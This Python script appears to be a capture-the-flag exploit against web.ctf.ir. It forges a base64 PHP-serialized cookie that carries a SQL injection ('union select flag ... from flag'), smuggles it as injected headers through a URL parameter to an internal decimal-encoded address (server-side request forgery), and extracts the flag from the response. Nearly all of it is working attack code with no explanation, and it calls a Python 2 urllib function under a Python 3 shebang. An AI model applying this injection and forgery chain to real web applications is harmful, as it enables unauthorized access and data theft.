#!/usr/bin/env python3

import base64, requests, readline, code, re, warnings
import requests
import sys
import urllib

warnings.filterwarnings('ignore')

userid = "0)' union select flag,2,3 from flag ;# "
serial = 'a:2:{s:2:"id";s:%s:"%s";s:8:"username";s:0:"";}'
serial = serial % (len(userid), userid)
user_info = base64.b64encode(serial.encode()).decode()

request = """

Cookie: USERINFO={}; login=true
Connection: Keep-Alive

x-leftover:

""".format(user_info)

x = urllib.quote_plus(request).replace('+', '%20').replace('%3A', ':').replace('%3D', '=').replace('%0A%0A', '%0d%0a')
# print(x)
url = 'http://web.ctf.ir:5555/cgi-bin/index.py?url=%20&url=http://185207373{}:80/index.php'.format(x)

print(url)

r = requests.get(url)

regex = re.compile('\(id=(.+)\)')
t = regex.search(r.text)
try:
    print( t.groups()[0])
except:
    print(r.text)
